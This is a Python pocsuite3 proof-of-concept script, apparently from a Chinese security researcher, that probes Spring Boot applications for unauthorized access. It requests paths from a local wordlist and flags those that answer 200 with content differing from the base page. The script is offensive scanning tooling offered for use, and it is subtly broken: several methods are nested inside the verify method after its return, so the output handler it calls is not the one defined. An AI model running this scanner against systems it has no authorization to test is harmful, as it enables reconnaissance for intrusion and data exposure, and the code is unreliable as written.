"""
作者 charis
时间 2023-1-9
"""
import time
import re
import os
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, get_listener_ip, get_listener_port, VUL_TYPE
from pocsuite3.lib.core.enums import OS_ARCH, OS
from pocsuite3.lib.utils import random_str, generate_shellcode_list
from pocsuite3.modules.dnslog import Dnslog
from pocsuite3.modules.encryption import Encryption
from collections import OrderedDict
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.api import OptString


class DemoPOC(POCBase):
    vulID = '4'  # ssvid
    version = '1.0'
    author = ['charis']
    vulDate = '未知'
    createDate = '2023-01-09'
    updateDate = '2023-01-09'
    references = ['无']
    name = 'Spring boot未授权访问漏洞'
    appPowerLink = 'https://spring.io/projects/spring-boot'
    appName = 'Spring boot'
    appVersion = 'Spring version from all'
    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS
    desc = '''Spring Boot是由Pivotal团队提供的全新框架，其设计目的是用来简化新Spring应用的初始搭建以及开发过程。该框架使用了特定的方式来进行配置，从而使开发人员不再需要定义样板化的配置。通过这种方式，Spring Boot致力于在蓬勃发展的快速应用开发领域(rapid application development)成为领导者。'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    #加载spring-boot-dir字典方法
    def openDict(self):
        with open(os.getcwd() + "/data/Spring-boot-dir.txt", "r", encoding="utf-8") as f:
            return f.readlines()


    # 定义检查方法
    def _check(self, url):
        if self.openDict():
            payloads = self.openDict()

            # 获取原始数据
            flag = len(requests.get(url).text)

            for payload in payloads:
                vul_url = url + payload.strip("\n")

                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "close",
                    "Upgrade-Insecure-Requests": "1"
                }
                try:
                    r = requests.get(vul_url, headers=headers)
                    if r.status_code == 200:
                        if len(r.text) !=flag:
                            return url, url + payload
                except requests.exceptions.RequestException as e:
                    pass
        else:
            print("无法加载spring-boot-dir字典，请检测路径！")
        return False

    def _verify(self):

        result = {}
        p = self._check(self.url)
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = p[0]
            result['VerifyInfo']['payload'] = p[1]
        return self.parse_output(result)

        def _attack(self):
            exit("无需获取shell")

        def _shell(self):
            exit("无需获取shell")

        def parse_output(self, result):
            output = Output(self)
            if result:
                output.success(result)
            else:
                output.fail('target is not vulnerable')
            return output

register_poc(DemoPOC)


